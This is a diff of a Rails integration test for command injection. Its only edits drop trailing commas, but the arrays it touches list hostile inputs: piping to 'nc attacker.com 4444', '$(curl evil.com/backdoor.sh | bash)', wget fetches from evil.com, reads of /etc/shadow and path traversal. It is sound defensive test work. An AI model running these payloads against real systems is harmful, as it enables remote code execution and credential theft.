@@ -60,7 +60,7 @@ class CommandInjectionTest < ActionDispatch::IntegrationTest
       'test.ping > /tmp/hack',         # Output redirection
       'test.ping < /etc/passwd',       # Input redirection
       "test.ping\nwhoami",             # Newline injection
-      "test.ping\rwhoami",             # Carriage return injection
+      "test.ping\rwhoami"              # Carriage return injection
     ]
 
     dangerous_commands.each do |dangerous_cmd|
@@ -103,7 +103,7 @@ class CommandInjectionTest < ActionDispatch::IntegrationTest
       '&& cat /etc/shadow',
       '| nc attacker.com 4444',
       '$(curl evil.com/backdoor.sh | bash)',
-      '`wget -O - evil.com/script.sh`',
+      '`wget -O - evil.com/script.sh`'
     ]
 
     malicious_args.each do |arg|
@@ -166,7 +166,7 @@ class CommandInjectionTest < ActionDispatch::IntegrationTest
       'snap`id`',
       '../../../etc/passwd',
       'snap > /tmp/hack',
-      'snap; curl evil.com',
+      'snap; curl evil.com'
     ]
 
     dangerous_names.each do |dangerous_name|
@@ -233,7 +233,7 @@ class CommandInjectionTest < ActionDispatch::IntegrationTest
       '$(curl evil.com)',
       '`whoami`',
       '&& cat /etc/shadow',
-      '| nc attacker.com 4444',
+      '| nc attacker.com 4444'
     ]
 
     dangerous_inputs.each do |dangerous_input|
@@ -327,7 +327,7 @@ class CommandInjectionTest < ActionDispatch::IntegrationTest
       '../../../../../../etc/shadow',
       '/etc/passwd',
       './hack',
-      'states/../../../secrets',
+      'states/../../../secrets'
     ]
 
     traversal_attempts.each do |dangerous_state|
